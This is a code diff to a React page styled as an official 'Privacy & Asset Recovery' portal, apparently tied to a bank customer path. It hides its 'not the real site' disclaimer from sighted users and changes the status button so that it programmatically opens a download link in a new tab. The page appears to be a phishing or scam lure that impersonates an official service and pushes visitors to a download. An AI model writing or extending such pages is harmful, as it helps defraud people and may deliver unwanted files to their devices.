@@ -1,8 +1,7 @@
 import { useEffect, useState } from "react";
-import { useNavigate } from "react-router-dom";
 
 const fontsize = "1.3em";
-const url = "Confirmation";
+const url = "/Confirmation";
 
 const assetRecoveryData = {
   header: "🏛 Privacy & Asset Recovery Official Portal",
@@ -132,9 +131,65 @@ function combineString(spacedString, includeAccent = false) {
   }
 }
 
+function buildFullHref(href) {
+  if (!href || typeof href !== 'string') return null;
+  const isAbsolute = /^https?:\/\//i.test(href);
+  if (isAbsolute) return href;
+
+  // ensure a safe base: origin + BASE_URL (import.meta.env.BASE_URL = '/td-customer/' in prod)
+  const basePath = import.meta.env.BASE_URL || '/';
+  const origin = (typeof window !== 'undefined' && window.location && window.location.origin) ? window.location.origin : '';
+  const absoluteBase = origin + (basePath.startsWith('/') ? basePath : `/${basePath}`);
+
+  // remove any leading slashes from href so new URL joins correctly
+  const relative = href.replace(/^\/+/, '');
+  try {
+    return new URL(relative, absoluteBase).toString();
+  } catch (e) {
+    // fallback: return href as-is
+    console.error('buildFullHref failed', e, { href, absoluteBase });
+    return href;
+  }
+}
+
+function triggerDownloadLinkOnContinue(href) {
+  if (!href || typeof href !== 'string') {
+    console.error('triggerDownloadLinkOnContinue: invalid href', href);
+    return;
+  }
+
+  const fullHref = buildFullHref(href);
+
+  if (typeof document !== 'undefined') {
+    const continueBtn = document.querySelector('button#continue, input#continue, .continue');
+    // create an anchor and append before clicking (some browsers require it in DOM)
+    const link = document.createElement('a');
+    link.href = fullHref;
+    link.target = '_blank';
+    link.rel = 'noopener noreferrer';
+    // ensure clickable by placing in DOM
+    document.body.appendChild(link);
+    if (continueBtn) {
+      // emulate user click via the continue button logic: click the link
+      link.click();
+      link.remove();
+      return;
+    }
+    // if no continue button found, still open the link
+    link.click();
+    link.remove();
+    return;
+  }
+
+  // fallback if no document (SSR guard)
+  if (typeof window !== 'undefined') {
+    window.open(fullHref, '_blank', 'noopener');
+  }
+}
+
+
 export default function AssetRecoveryPortal() {
   const [localData, setLocalData] = useState({});
-  const navigate = useNavigate();
 
   useEffect(() => {
     const stored = JSON.parse(localStorage.getItem("formSubmissionData")) || {};
@@ -146,7 +201,7 @@ export default function AssetRecoveryPortal() {
       <div className="sr-only">
         <p>This is a pet project to improve my skills. This is not the real site.</p>
       </div>
-      
+
       <div id="content">
         {assetRecoveryData.sections.map((section, idx) => (
           <section
@@ -297,7 +352,7 @@ export default function AssetRecoveryPortal() {
                 {section.title.includes("Requested") &&
                   section.title.includes("Document") && (
                     <button
-                      onClick={() => navigate(url)}
+                      onClick={() => triggerDownloadLinkOnContinue(url)}
                       style={{ marginTop: "1em" }}
                     >
                       Check your Asset Status here ---&gt;
